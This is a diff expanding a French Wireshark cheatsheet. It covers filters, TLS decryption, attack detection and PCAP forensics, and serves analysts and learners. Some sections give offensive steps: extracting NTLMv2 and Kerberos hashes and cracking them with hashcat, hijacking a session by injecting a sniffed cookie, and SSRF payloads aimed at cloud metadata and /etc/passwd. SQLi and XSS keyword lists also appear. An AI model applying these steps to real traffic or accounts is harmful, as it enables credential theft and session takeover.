@@ -1,127 +1,1860 @@
-# 📡 Wireshark - Cheatsheet Cyber Sécurité
+# 🦈 Wireshark - Cheatsheet Cyber Sécurité
+
+Guide orienté **exploitation**, **détection de failles** et **décryptage** avec Wireshark. Focus sur l'analyse offensive et la forensique d'attaques.
 
 ---
 
-## 1️⃣ Capture de trafic réseau
+## 1️⃣ Filtres d'Affichage Essentiels
 
-- Lancer Wireshark et sélectionner l’interface réseau active (ex : eth0, wlan0).  
+### Protocoles de base
+```
+http                              # Trafic HTTP non chiffré
+tls                               # Trafic HTTPS/TLS
+dns                               # Requêtes DNS
+ftp                               # FTP (credentials en clair)
+ssh                               # SSH
+smb || smb2                       # Partages Windows
+telnet                            # Telnet (tout en clair)
+smtp                              # Email
+rdp                               # Remote Desktop
+```
 
-- Filtrer la capture directement via la barre de filtre (ex : ip.addr == 192.168.1.10).
+### Filtres IP et Ports
+```
+ip.addr == 192.168.1.100          # Tout trafic depuis/vers cette IP
+ip.src == 192.168.1.100           # Source uniquement
+ip.dst == 192.168.1.100           # Destination uniquement
+
+tcp.port == 80                    # Port 80 (HTTP)
+tcp.port == 443                   # Port 443 (HTTPS)
+tcp.port == 22                    # Port 22 (SSH)
+udp.port == 53                    # Port 53 (DNS)
+
+tcp.port >= 1024 && tcp.port <= 65535  # Ports éphémères
+```
+
+### Combinaisons logiques
+```
+ip.addr == 192.168.1.100 && tcp.port == 80
+ip.src == 10.0.0.1 || ip.src == 10.0.0.2
+!(arp || icmp)                    # Exclure ARP et ICMP
+http && ip.addr == 192.168.1.0/24
+```
 
 ---
 
-## 2️⃣ Filtres d’affichage (Display Filters)
+## 2️⃣ Décryptage HTTPS/TLS
 
-```
-ip  
-```
-> Affiche tous les paquets IP
+### Méthode 1 : Clé Privée du Serveur
 
+**Configuration Wireshark**
 ```
-tcp.port == 80  
-```
-> Filtre le trafic TCP sur le port 80 (HTTP)
+Edit > Preferences > Protocols > TLS
 
+RSA keys list > Add new key :
+  - IP address: 192.168.1.100
+  - Port: 443
+  - Protocol: http
+  - Key File: /path/to/server.key
+  - Password: (si la clé est protégée)
 ```
-udp.port == 53  
-```
-> Filtre le trafic DNS (port UDP 53)
 
-```
-http.request.method == "GET"  
-```
-> Affiche les requêtes HTTP GET
+**Limites** :
+- Ne fonctionne PAS avec les cipher suites modernes (Perfect Forward Secrecy)
+- Nécessite la clé privée du serveur
+- Ne fonctionne qu'avec RSA key exchange
 
-```
-dns.qry.name == "example.com"  
-```
-> Recherche les requêtes DNS pour example.com
+### Méthode 2 : SSLKEYLOGFILE (Méthode Principale)
 
-```
-tcp.flags.syn == 1 and tcp.flags.ack == 0  
-```
-> Filtre les paquets SYN pour détecter les débuts de connexions TCP
+**Configuration du navigateur**
 
+**Linux/macOS**
+```bash
+# Firefox
+export SSLKEYLOGFILE=~/sslkeys.log
+firefox &
+
+# Chrome
+export SSLKEYLOGFILE=~/sslkeys.log
+google-chrome &
 ```
-frame contains "password"  
+
+**Windows (PowerShell)**
+```powershell
+$env:SSLKEYLOGFILE = "C:\Users\Username\sslkeys.log"
+Start-Process firefox
 ```
-> Recherche les paquets contenant le mot "password"
+
+**Configuration Wireshark**
+```
+Edit > Preferences > Protocols > TLS
+(Pre)-Master-Secret log filename: /path/to/sslkeys.log
+```
+
+**Vérification**
+```
+1. Lancer Wireshark avec SSLKEYLOGFILE configuré
+2. Naviguer sur https://example.com
+3. Filtrer : http ou http2
+4. Les données HTTPS apparaissent en clair !
+```
+
+### Analyse des données décryptées
+
+**Filtres HTTP après décryptage**
+```
+http.request                      # Requêtes HTTP décryptées
+http.request.method == "POST"     # POST avec données sensibles
+http.cookie contains "session"    # Cookies de session
+http.authorization                # Basic Auth
+http contains "password"          # Recherche de mots de passe
+```
+
+**Extraire les objets**
+```
+File > Export Objects > HTTP
+→ Voir tous les fichiers transférés en HTTPS
+```
 
 ---
 
-## 3️⃣ Analyse approfondie
+## 3️⃣ Décryptage et Encodage TCP
 
-```
-- Utiliser “Follow TCP Stream” (clic droit sur un paquet TCP)  
-```
-> Affiche la session complète en texte clair (utile pour HTTP, FTP, etc.).
+### Identifier l'encodage des données
 
+**Analyse du payload TCP**
 ```
-- Statistiques > Protocol Hierarchy  
+tcp.payload                       # Voir le contenu brut
+tcp.len > 0                       # TCP avec données (pas juste ACK)
+data                              # Afficher uniquement la couche données
 ```
-> Vue d’ensemble des protocoles capturés.
 
+**Right-click sur un paquet > Follow > TCP Stream**
 ```
-- Statistiques > Conversations  
+Affiche la conversation complète
+Options d'affichage :
+- ASCII
+- EBCDIC
+- Hex Dump
+- C Arrays
+- Raw
 ```
-> Analyse des échanges entre adresses IP et ports.
 
+### Détection d'encodage Base64
+
+**Recherche de patterns**
 ```
-- Statistiques > Endpoints  
+tcp contains "=="                 # Base64 se termine souvent par ==
+tcp matches "[A-Za-z0-9+/]{20,}==" # Pattern Base64
 ```
-> Liste des IP impliquées dans la capture.
+
+**Dans TCP Stream**
+```
+1. Follow TCP Stream
+2. Copier les données
+3. Utiliser un décodeur Base64 externe ou CyberChef
+```
+
+**Exemple d'identification** :
+```
+Données : dXNlcm5hbWU6cGFzc3dvcmQ=
+→ Base64 détecté (caractères A-Z, a-z, 0-9, +, /, =)
+→ Décoder : username:password
+```
+
+### Détection de chiffrement AES dans TCP
+
+**Indicateurs de chiffrement AES**
+```
+1. Entropie élevée (données aléatoires)
+2. Taille de bloc : multiples de 16 bytes (128 bits)
+3. Pas de patterns reconnaissables
+4. Analyse statistique montre distribution uniforme
+```
+
+**Analyse manuelle**
+```
+tcp.payload
+Right-click > Copy > Bytes as Hex Stream
+
+Outils d'analyse :
+- CyberChef : From Hex > Entropy
+- Python : calcul d'entropie
+```
+
+**Script Python pour détecter l'entropie**
+```python
+import math
+from collections import Counter
+
+def calculate_entropy(data):
+    if not data:
+        return 0
+    entropy = 0
+    counter = Counter(data)
+    for count in counter.values():
+        p_x = count / len(data)
+        entropy -= p_x * math.log2(p_x)
+    return entropy
+
+# Entropie > 7.5 = probablement chiffré
+# Entropie < 5 = texte clair
+```
+
+### Identification du mode AES
+
+**AES-ECB (Electronic Codebook)**
+- **Détection** : Blocs identiques produisent des ciphertexts identiques
+- **Vulnérable** : Patterns visibles
+- Rechercher des répétitions de 16 bytes
+
+**AES-CBC (Cipher Block Chaining)**
+- **Détection** : IV (Initialization Vector) au début (16 bytes aléatoires)
+- Plus sécurisé
+- Pas de patterns répétitifs
+
+**AES-GCM (Galois/Counter Mode)**
+- Mode moderne utilisé par TLS 1.3
+- Authentification intégrée
+- IV de 12 bytes généralement
+
+### Tentative de décryptage AES
+
+**Si vous avez la clé**
+```
+1. Extraire les données chiffrées : Copy > Bytes as Hex Stream
+2. Utiliser CyberChef :
+   - From Hex
+   - AES Decrypt
+   - Spécifier : Key, IV, Mode (CBC/ECB/GCM), Padding
+3. Ou utiliser OpenSSL :
+   
+   echo "ciphertext_hex" | xxd -r -p | openssl enc -d -aes-256-cbc -K <key> -iv <iv>
+```
+
+**Recherche de clés dans le trafic**
+```
+# Chercher des échanges de clés
+ssl.handshake.type == 1           # Client Hello
+ssl.handshake.type == 2           # Server Hello
+ssl.handshake.type == 11          # Certificate
+ssl.handshake.type == 12          # Server Key Exchange
+
+# Protocoles de key exchange
+diffie-hellman                    # DH key exchange
+```
+
+### Décryptage de protocoles custom
+
+**Étapes méthodologiques**
+```
+1. Identifier le pattern de communication
+   - Handshake initial
+   - Échange de clés
+   - Messages chiffrés
+
+2. Analyser la structure
+   - Longueur des messages
+   - Headers/Footers
+   - Magic bytes
+
+3. Chercher les clés en clair
+   tcp contains "key"
+   tcp contains "secret"
+   tcp contains "password"
+
+4. Reverse engineering du protocole
+   - Analyser plusieurs sessions
+   - Comparer les patterns
+   - Identifier les constantes
+```
 
 ---
 
-## 4️⃣ Exporter des données
+## 4️⃣ Extraction de Credentials
 
-```
-- File > Export Specified Packets  
-```
-> Exporter les paquets sélectionnés ou filtrés au format pcap.
+### HTTP Basic Authentication
 
-- Exporter les données brutes d’un flux TCP/UDP (Follow TCP Stream > Save As).
+**Filtre**
+```
+http.authorization                # Toutes les auth HTTP
+```
+
+**Décryptage**
+```
+1. Trouver : Authorization: Basic dXNlcjpwYXNz
+2. Extraire : dXNlcjpwYXNz
+3. Décoder Base64 : user:pass
+```
+
+**Automatisation**
+```
+Frame contient "Authorization: Basic"
+Copy > Value
+Base64 decode
+```
+
+### FTP Credentials
+
+**Filtre**
+```
+ftp.request.command == "USER"     # Username
+ftp.request.command == "PASS"     # Password
+```
+
+**Extraction**
+```
+1. Filtrer : ftp
+2. Chercher les commandes USER et PASS
+3. Les credentials sont en clair !
+```
+
+### SMTP Credentials
+
+**Filtre**
+```
+smtp.req.command == "AUTH"        # Authentification SMTP
+smtp.auth                         # Auth methods
+```
+
+**Types d'auth**
+```
+AUTH PLAIN   : Base64, facile à décoder
+AUTH LOGIN   : Base64, username et password séparés
+AUTH CRAM-MD5: Challenge-response, plus difficile
+```
+
+### Telnet (100% en clair)
+
+**Filtre**
+```
+telnet
+```
+
+**Extraction**
+```
+Follow TCP Stream
+→ Tout est visible : username, password, commandes
+```
+
+### NTLM Hashes (SMB/HTTP)
+
+**Filtre**
+```
+ntlmssp                           # Protocole NTLM
+ntlmssp.auth.ntlmv2_response      # Challenge-Response NTLMv2
+```
+
+**Extraction**
+```
+1. Filtrer : ntlmssp
+2. Trouver le paquet NTLMSSP_AUTH (type 3)
+3. Extraire :
+   - Username : ntlmssp.auth.username
+   - Domain : ntlmssp.auth.domain
+   - NTLMv2 Response : ntlmssp.auth.ntlmv2_response
+   - Challenge : ntlmssp.challenge
+```
+
+**Format pour Hashcat**
+```
+username::domain:challenge:ntlmv2_response:ntlmv2_response
+
+Exemple :
+admin::WORKGROUP:1122334455667788:response_hex:blob_hex
+
+Cracking :
+hashcat -m 5600 hash.txt rockyou.txt
+```
+
+### Kerberos Tickets
+
+**Filtre**
+```
+kerberos                          # Tout Kerberos
+kerberos.msg_type == 11           # AS-REP (contient le TGT chiffré)
+kerberos.msg_type == 13           # TGS-REP (contient le ticket de service)
+```
+
+**Extraction pour Kerberoasting**
+```
+1. Filtrer : kerberos.msg_type == 13
+2. Extraire : kerberos.cipher
+3. Convertir au format Hashcat
+
+Format :
+$krb5tgs$23$*user$realm$service*$hash
+
+Cracking :
+hashcat -m 13100 ticket.txt rockyou.txt
+```
 
 ---
 
-## 5️⃣ Astuces pour la cybersécurité
+## 5️⃣ Détection d'Attaques Réseau
 
-- **Détection d’attaques** : filtrer les paquets SYN flood avec  
-  tcp.flags.syn == 1 and tcp.flags.ack == 0 and frame.len > 1000
+### ARP Spoofing / Man-in-the-Middle
 
-- **Extraction de fichiers** : extraire des fichiers transférés via HTTP, FTP, SMB, etc.
+**Filtres de détection**
+```
+arp.duplicate-address-detected    # Détection automatique Wireshark
+arp                               # Analyser manuellement
+```
 
-- **Détection de mots de passe en clair** : chercher “password”, “Authorization”, “Basic” dans les flux HTTP.
+**Analyse manuelle**
+```
+1. Filtrer : arp
+2. Statistics > Endpoints > Ethernet
+3. Chercher plusieurs IPs avec la même MAC
+4. Ou la même IP avec plusieurs MACs différentes
+```
 
-- **Suivi de sessions chiffrées** : analyser le TLS handshake et certificats.
+**Indicateurs**
+```
+- Plusieurs réponses ARP pour la même IP
+- MAC address change fréquemment
+- Gratuitous ARP suspects (arp.dst.hw_mac == 00:00:00:00:00:00)
+```
 
-- **Utiliser Tshark** (version en ligne de commande de Wireshark) pour automatiser des analyses :  
-  tshark -i eth0 -w capture.pcap
+### Port Scanning (Nmap)
+
+**Détection SYN Scan**
+```
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+```
+
+**Analyse**
+```
+Statistics > Conversations > TCP
+→ Chercher une IP source avec :
+  - Nombreuses conversations
+  - Peu de paquets par conversation
+  - Beaucoup de ports différents
+```
+
+**Détection Nmap spécifique**
+```
+# Nmap a des signatures reconnaissables
+tcp.window_size_value == 1024     # Fenêtre TCP typique de Nmap
+tcp.window_size_value == 2048
+tcp.window_size_value == 3072
+tcp.window_size_value == 4096
+```
+
+**Types de scans**
+```
+SYN Scan (-sS)        : tcp.flags == 0x002 (SYN uniquement)
+Connect Scan (-sT)    : 3-way handshake complet
+FIN Scan (-sF)        : tcp.flags.fin == 1
+NULL Scan (-sN)       : tcp.flags == 0x000
+XMAS Scan (-sX)       : tcp.flags.fin == 1 && tcp.flags.push == 1 && tcp.flags.urg == 1
+```
+
+### DDoS / DoS Attacks
+
+**SYN Flood**
+```
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+Analyse :
+Statistics > I/O Graph
+→ Pic massif de paquets SYN
+→ Peu de réponses SYN-ACK
+```
+
+**UDP Flood**
+```
+udp
+
+Analyse :
+Statistics > Conversations > UDP
+→ Volume anormal de paquets UDP
+→ Depuis une ou plusieurs sources
+```
+
+**ICMP Flood / Ping of Death**
+```
+icmp
+icmp.type == 8                    # Echo Request
+
+Détection :
+- Volume très élevé de ping
+- Taille anormale : ip.len > 1500
+```
+
+**DNS Amplification**
+```
+dns && frame.len > 512            # Réponses DNS volumineuses
+dns.flags.response == 1 && udp.length > 512
+
+Indicateurs :
+- Nombreuses réponses DNS vers une seule IP
+- Taille des réponses très grande
+- Sources multiples (serveurs DNS)
+```
+
+### DNS Tunneling / Exfiltration
+
+**Détection**
+```
+dns.qry.name.len > 50             # Requêtes DNS anormalement longues
+dns && frame.len > 512            # Paquets DNS volumineux
+```
+
+**Analyse**
+```
+1. Filtrer : dns.qry.name.len > 50
+2. Examiner les noms de domaine :
+   - Sous-domaines très longs
+   - Caractères hexadécimaux ou base64
+   - Patterns répétitifs
+```
+
+**Exemples suspects**
+```
+# DNS Tunneling
+a1b2c3d4e5f6.tunnel.example.com
+ZGF0YWV4ZmlsdHJhdGlvbg==.evil.com
+68656c6c6f776f726c64.attacker.com
+
+# C2 Communication
+32charsmd5hash12345678901234.c2server.com
+```
+
+**Outils de tunneling détectables**
+```
+- dnscat2
+- iodine
+- dns2tcp
+```
+
+### SQL Injection dans le trafic
+
+**Détection dans HTTP**
+```
+http.request.uri contains "'"
+http.request.uri contains "OR 1=1"
+http.request.uri contains "UNION SELECT"
+http.request.uri contains "--"
+http.request.uri contains "/*"
+http.request.uri contains "xp_"
+http.request.uri contains "sleep("
+http.request.uri contains "benchmark("
+```
+
+**Dans POST data**
+```
+http.request.method == "POST"
+http.file_data contains "' OR '1'='1"
+```
+
+### XSS dans le trafic
+
+**Détection**
+```
+http.request.uri contains "<script>"
+http.request.uri contains "javascript:"
+http.request.uri contains "onerror="
+http.request.uri contains "onload="
+http.request.uri contains "<svg"
+http.request.uri contains "<img"
+```
 
 ---
 
-## 6️⃣ Commandes utiles Tshark
+## 6️⃣ Analyse de Protocoles Avancés
 
-```
-tshark -i eth0  
-```
-> Capture sur interface eth0
+### SMB/CIFS Analysis
 
+**Filtres essentiels**
 ```
-tshark -r fichier.pcap -Y "http.request.method == GET"  
+smb || smb2                       # Protocole SMB
+smb2.cmd == 1                     # Session Setup
+smb2.cmd == 3                     # Tree Connect
+smb2.filename                     # Fichiers accédés
 ```
-> Analyse un fichier pcap et filtre les requêtes HTTP GET
 
+**Détecter les partages**
 ```
-tshark -i eth0 -f "tcp port 80" -c 100  
+smb2.tree                         # Voir les shares connectés
+smb2.filename contains ".exe"     # Exécutables transférés
+smb2.filename contains ".ps1"     # Scripts PowerShell
 ```
-> Capture 100 paquets sur port 80 uniquement
+
+**Vulnérabilités SMB**
+```
+# EternalBlue (MS17-010)
+smb.native_os contains "Windows 5"  # Windows XP/2003
+smb2.dialect == 0x0202              # SMBv2.0.2
+
+# SMB Signing
+smb2.security_mode.signing_required
+→ Si désactivé = vulnérable à MitM
+```
+
+### SSH Analysis
+
+**Détection de brute force**
+```
+ssh
+
+Statistics > Conversations > TCP
+→ Chercher de nombreuses connexions courtes sur port 22
+```
+
+**Version banner grabbing**
+```
+ssh.protocol
+→ Voir les versions SSH (peut révéler des vulnérabilités)
+```
+
+### RDP Analysis
+
+**Filtre**
+```
+rdp
+tpkt
+```
+
+**Détection d'attaques**
+```
+# BlueKeep (CVE-2019-0708)
+rdp && tcp.port == 3389
+→ Analyser les patterns de connexion
+
+# RDP Brute Force
+Nombreuses tentatives sur port 3389
+Statistics > Conversations > TCP
+```
 
 ---
 
-## 📌 Ressources utiles
+## 7️⃣ Analyse HTTP/Web
 
-- Documentation officielle : https://www.wireshark.org/docs/  
-- Wireshark Cheat Sheet : https://www.wireshark.org/docs/wsug_html_chunked/ChapterIntroduction.html  
-- Tutoriels vidéo : https://www.youtube.com/user/wiresharkorg  
-- Tshark man page : https://www.wireshark.org/docs/man-pages/tshark.html
+### Recherche d'informations sensibles
+
+**Passwords en clair**
+```
+http contains "password"
+http contains "passwd"
+http contains "pwd"
+http.request.method == "POST" && http contains "username"
+```
+
+**API Keys et Tokens**
+```
+http contains "api_key"
+http contains "token"
+http contains "bearer"
+http contains "secret"
+```
+
+**Cookies sensibles**
+```
+http.cookie contains "session"
+http.cookie contains "PHPSESSID"
+http.cookie contains "JSESSIONID"
+http.cookie contains "ASP.NET_SessionId"
+```
+
+### Session Hijacking
+
+**Extraire les cookies**
+```
+http.cookie
+Set-Cookie
+
+Follow HTTP Stream
+→ Copier les cookies de session
+```
+
+**Utilisation**
+```
+1. Capturer : Cookie: session=abc123xyz
+2. Injecter dans votre navigateur (F12 > Console)
+   document.cookie = "session=abc123xyz"
+3. Rafraîchir la page → Session hijackée
+```
+
+### SSRF dans les requêtes
+
+**Détection**
+```
+http.request.uri contains "url="
+http.request.uri contains "file="
+http.request.uri contains "path="
+http.request.uri contains "dest="
+http.request.uri contains "redirect="
+```
+
+**Payloads SSRF visibles**
+```
+url=http://localhost
+url=http://127.0.0.1
+url=http://169.254.169.254  # AWS Metadata
+url=file:///etc/passwd
+```
+
+---
+
+## 8️⃣ Forensique et Malware Analysis
+
+### Communication C2 (Command & Control)
+
+**Beacons réguliers**
+```
+Statistics > I/O Graph
+→ Chercher des patterns répétitifs (intervalles fixes)
+→ Indicateur de beacon malware
+```
+
+**Domaines suspects**
+```
+dns.qry.name contains "duckdns"   # DNS dynamique
+dns.qry.name contains "no-ip"
+dns.qry.name matches "^[a-f0-9]{32}\\..*"  # Domaines avec hashes
+```
+
+**User-Agents malveillants**
+```
+http.user_agent contains "Bot"
+http.user_agent contains "Crawler"
+http.user_agent contains "Scanner"
+http.user_agent == "Mozilla/4.0"  # User-Agent obsolète
+```
+
+### Extraction de fichiers
+
+**HTTP Objects**
+```
+File > Export Objects > HTTP
+→ Extraire tous les fichiers téléchargés/uploadés
+```
+
+**Fichiers suspects**
+```
+http.request.uri contains ".exe"
+http.request.uri contains ".dll"
+http.request.uri contains ".ps1"
+http.content_type contains "application/x-msdownload"
+```
+
+**SMB Files**
+```
+File > Export Objects > SMB
+→ Extraire les fichiers transférés via SMB
+```
+
+### Analyse de payload
+
+**Recherche de shellcode**
+```
+tcp.payload
+data
+
+Right-click > Follow TCP Stream
+→ Chercher des patterns de shellcode :
+  - \x90 (NOP sled)
+  - Patterns répétitifs
+  - Instructions x86/x64
+```
+
+**Recherche de strings**
+```
+Edit > Find Packet > String search
+
+Rechercher :
+- Noms de fichiers suspects
+- IPs internes
+- Credentials
+- Commandes système
+```
+
+---
+
+## 9️⃣ TLS/SSL Security Analysis
+
+### Cipher Suites Analysis
+
+**Voir les cipher suites négociées**
+```
+tls.handshake.ciphersuite
+```
+
+**Cipher suites FAIBLES (à éviter)**
+```
+# RC4 (cassé)
+tls.handshake.ciphersuite == 0x0004  # TLS_RSA_WITH_RC4_128_MD5
+tls.handshake.ciphersuite == 0x0005  # TLS_RSA_WITH_RC4_128_SHA
+
+# DES/3DES (obsolète)
+tls.handshake.ciphersuite == 0x000a  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
+
+# Export ciphers (très faibles)
+tls.handshake.ciphersuite contains "EXPORT"
+```
+
+**Cipher suites FORTS (recommandés)**
+```
+# AES-GCM
+0x009c  # TLS_RSA_WITH_AES_128_GCM_SHA256
+0x009d  # TLS_RSA_WITH_AES_256_GCM_SHA384
+
+# ChaCha20-Poly1305
+0xcca8  # TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256
+```
+
+### Versions TLS
+
+**Détecter les versions obsolètes**
+```
+tls.handshake.version == 0x0300       # SSL 3.0 (OBSOLÈTE)
+tls.handshake.version == 0x0301       # TLS 1.0 (DÉPRÉCIÉ)
+tls.handshake.version == 0x0302       # TLS 1.1 (DÉPRÉCIÉ)
+tls.handshake.version == 0x0303       # TLS 1.2 (OK)
+tls.handshake.version == 0x0304       # TLS 1.3 (MEILLEUR)
+```
+
+### Certificate Analysis
+
+**Examiner les certificats**
+```
+tls.handshake.type == 11              # Certificate message
+tls.handshake.certificate
+```
+
+**Right-click sur paquet Certificate > Expand TLS > Certificate**
+```
+Vérifier :
+- Issuer (émetteur)
+- Subject (sujet)
+- Validity dates
+- SAN (Subject Alternative Names)
+- Signature algorithm
+```
+
+**Détecter certificats auto-signés**
+```
+tls.handshake.certificate
+→ Issuer == Subject = Auto-signé
+→ Indicateur potentiel de MitM
+```
+
+### Heartbleed Detection
+
+**CVE-2014-0160**
+```
+ssl.heartbeat_message
+
+Chercher :
+- Heartbeat requests anormalement longs
+- Heartbeat responses contenant des données sensibles
+```
+
+---
+
+## 🔟 Statistiques et Visualisation
+
+### Protocol Hierarchy
+
+```
+Statistics > Protocol Hierarchy
+```
+
+**Analyse**
+- Répartition du trafic par protocole
+- Identifier les protocoles inhabituels
+- Détecter les anomalies volumétriques
+
+### Conversations
+
+```
+Statistics > Conversations > TCP/UDP/IPv4
+```
+
+**Indicateurs d'attaque**
+- Un hôte communiquant avec de nombreux autres : Scan ou C2
+- Nombreuses connexions courtes : Port scan
+- Volume anormal vers un seul hôte : Exfiltration ou DDoS
+
+### Endpoints
+
+```
+Statistics > Endpoints > IPv4/TCP/UDP
+```
+
+**Analyse**
+- Top talkers (IPs les plus actives)
+- Identifier les IPs suspectes
+- Repérer les sources d'attaque
+
+### I/O Graphs
+
+```
+Statistics > I/O Graph
+```
+
+**Graphes utiles**
+```
+Graph 1 : tcp.flags.syn == 1        # Connexions
+Graph 2 : tcp.flags.reset == 1      # Resets (anomalies)
+Graph 3 : tcp.analysis.retransmission  # Problèmes réseau
+Graph 4 : dns                       # Activité DNS
+Graph 5 : http                      # Trafic web
+```
+
+**Détecter les anomalies**
+- Pics soudains de trafic
+- Patterns répétitifs (beacons)
+- Activité en dehors des heures normales
+
+---
+
+## 1️⃣1️⃣ Filtres Avancés
+
+### Recherche dans le payload
+
+```
+tcp contains "password"           # Chercher dans tout le TCP
+http contains "admin"             # Chercher dans HTTP
+data contains "flag{"             # Chercher dans les données
+```
+
+### Regex (matches)
+
+```
+http.host matches ".*\\.ru$"      # Domaines .ru
+dns.qry.name matches "^[a-f0-9]{32}\\."  # Hashes MD5 dans DNS
+http.user_agent matches "(?i)bot|crawler"  # User-agents suspects
+```
+
+### Flags TCP
+
+```
+tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN (nouvelle connexion)
+tcp.flags.syn == 1 && tcp.flags.ack == 1  # SYN-ACK (réponse)
+tcp.flags.reset == 1                      # RST (connexion fermée brutalement)
+tcp.flags.fin == 1                        # FIN (fermeture propre)
+tcp.flags.push == 1                       # PUSH (données immédiates)
+tcp.flags.urg == 1                        # URG (données urgentes - rare)
+```
+
+### Analyse TCP avancée
+
+```
+tcp.analysis.retransmission       # Retransmissions (problèmes réseau)
+tcp.analysis.duplicate_ack        # ACKs dupliqués
+tcp.analysis.lost_segment         # Segments perdus
+tcp.analysis.window_full          # Fenêtre TCP pleine
+tcp.analysis.zero_window          # Fenêtre à zéro (congestion)
+```
+
+### TTL Analysis (Spoofing detection)
+
+```
+ip.ttl < 10                       # TTL très bas (suspect)
+ip.ttl == 64                      # Linux/Unix default
+ip.ttl == 128                     # Windows default
+ip.ttl == 255                     # Cisco/Réseau equipment
+
+# TTL inhabituel = potentiel spoofing
+```
+
+---
+
+## 1️⃣2️⃣ Follow Streams
+
+### TCP Stream
+
+```
+Right-click > Follow > TCP Stream
+
+Affichages :
+- ASCII : Texte lisible
+- EBCDIC : Encodage IBM
+- Hex Dump : Vue hexadécimale
+- C Arrays : Format code C
+- Raw : Données brutes
+```
+
+**Utilisation**
+```
+1. Reconstruire une conversation complète
+2. Voir les requêtes et réponses
+3. Extraire des credentials
+4. Analyser un protocole custom
+```
+
+### UDP Stream
+
+```
+Right-click > Follow > UDP Stream
+```
+
+**Cas d'usage**
+- Analyser des protocoles UDP custom
+- DNS over UDP
+- TFTP transfers
+- VoIP/RTP
+
+### TLS/SSL Stream
+
+```
+Right-click > Follow > TLS Stream
+```
+
+**Nécessite**
+- Décryptage configuré (SSLKEYLOGFILE)
+- Affiche les données HTTP décryptées
+
+---
+
+## 1️⃣3️⃣ Coloration et Organisation
+
+### Coloring Rules
+
+```
+View > Coloring Rules
+
+Règles recommandées :
+tcp.analysis.retransmission       → Rouge foncé
+http.request.method == "POST"     → Jaune
+tls                               → Vert clair
+dns.flags.rcode == 3              → Orange (NXDOMAIN)
+arp.duplicate-address-detected    → Rouge vif
+icmp.type == 8                    → Bleu clair
+```
+
+### Colonnes personnalisées
+
+```
+Edit > Preferences > Appearance > Columns
+
+Colonnes utiles :
+- HTTP Host : http.host
+- HTTP Method : http.request.method
+- DNS Query : dns.qry.name
+- TLS SNI : tls.handshake.extensions_server_name
+- TCP Stream : tcp.stream
+- HTTP Status : http.response.code
+```
+
+---
+
+## 1️⃣4️⃣ Cheatsheet Rapide - Attaques Détectables
+
+### 🔴 HIGH : Credentials et Hashes
+
+| Protocol | Filtre | Données Exposées |
+|----------|--------|------------------|
+| FTP | `ftp` | USER/PASS en clair |
+| Telnet | `telnet` | Tout en clair |
+| HTTP Basic | `http.authorization` | Base64 → decode |
+| HTTP POST | `http.request.method == "POST"` | Form data visible |
+| SMTP | `smtp.auth` | AUTH PLAIN visible |
+| NTLM | `ntlmssp` | Hashes NTLMv2 |
+| Kerberos | `kerberos` | Tickets TGS |
+
+### 🟠 MEDIUM : Attaques Réseau
+
+| Attaque | Filtre | Indicateurs |
+|---------|--------|-------------|
+| ARP Spoofing | `arp.duplicate-address-detected` | IPs/MACs dupliqués |
+| Port Scan | `tcp.flags.syn == 1 && tcp.flags.ack == 0` | Nombreux SYN, peu ACK |
+| DDoS/SYN Flood | `tcp.flags.syn == 1` | Volume massif SYN |
+| DNS Tunneling | `dns.qry.name.len > 50` | Sous-domaines longs |
+| DNS Amplification | `dns && frame.len > 512` | Réponses DNS volumineuses |
+
+### 🟡 LOW : Reconnaissance
+
+| Technique | Filtre | Information |
+|-----------|--------|-------------|
+| Banner Grab | `http.server` | Versions serveurs |
+| OS Fingerprint | `tcp.window_size` | Type OS |
+| DNS Enumeration | `dns` | Infrastructure domaine |
+| SNMP | `snmp` | Community strings |
+
+---
+
+## 1️⃣5️⃣ Décryptage Avancé - Protocoles Customs
+
+### Identifier un protocole chiffré custom
+
+**Étape 1 : Analyse du handshake**
+```
+Filtrer sur le port suspect : tcp.port == 12345
+
+Chercher :
+1. Échange initial (souvent en clair)
+2. Magic bytes ou signature
+3. Version du protocole
+4. Négociation de chiffrement
+```
+
+**Étape 2 : Analyser la structure**
+```
+Follow TCP Stream
+
+Observer :
+- Taille des messages (multiples de 16 = AES)
+- Headers fixes (longueur, type, séquence)
+- Patterns répétitifs
+- Données aléatoires = chiffrées
+```
+
+**Étape 3 : Recherche de clés**
+```
+tcp contains "key"
+tcp contains "secret"
+tcp contains "password"
+tcp contains "shared"
+
+# Chercher dans les premiers paquets de la connexion
+tcp.stream eq 0 && frame.number < 10
+```
+
+### Cas pratique : Décryptage VPN custom
+
+**Exemple : OpenVPN sans TLS**
+```
+1. Identifier le port : udp.port == 1194
+2. Extraire le handshake :
+   openvpn.opcode == 1  # P_CONTROL_HARD_RESET_CLIENT_V2
+3. Chercher la clé statique :
+   - Dans fichier .ovpn client
+   - Ou dans la config serveur
+4. Utiliser openvpn --show-tls pour décrypter
+```
+
+### Décryptage avec clés récupérées
+
+**Workflow CyberChef**
+```
+1. Export paquet : Copy > Bytes as Hex Stream
+2. CyberChef (gchq.github.io/CyberChef)
+3. Recette :
+   - From Hex
+   - AES Decrypt
+   - Paramètres :
+     * Key : (clé hex)
+     * IV : (si CBC/CTR)
+     * Mode : CBC/ECB/GCM/CTR
+     * Input : Hex
+     * Output : Raw
+```
+
+**Exemple concret**
+```
+Données hex : 7b8f3e2a1c9d4b5e...
+Clé AES-256 : 603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4
+IV : 000102030405060708090a0b0c0d0e0f
+Mode : CBC
+
+CyberChef > Résultat : {"user":"admin","role":"superuser"}
+```
+
+---
+
+## 1️⃣6️⃣ Analyse de Fichiers PCAP Forensique
+
+### Timeline d'attaque
+
+**Reconstruire les événements**
+```
+1. Trier par temps : View > Time Display Format > UTC
+2. Identifier l'infection initiale :
+   - Premier contact externe suspect
+   - Téléchargement de fichier malveillant
+3. Tracer la progression :
+   - Beaconing C2
+   - Lateral movement
+   - Exfiltration de données
+```
+
+**Filtres timeline**
+```
+frame.time >= "2024-01-15 14:30:00" && frame.time <= "2024-01-15 14:35:00"
+
+# Premier contact
+http.request.uri contains ".exe" || http.request.uri contains ".dll"
+
+# Beaconing
+Statistics > I/O Graph (chercher patterns réguliers)
+
+# Exfiltration
+tcp.len > 1460  # Paquets pleins (upload de données)
+```
+
+### Indicateurs de Compromission (IoCs)
+
+**IPs malveillantes**
+```
+ip.addr == 185.220.101.1          # Exemple TOR exit node
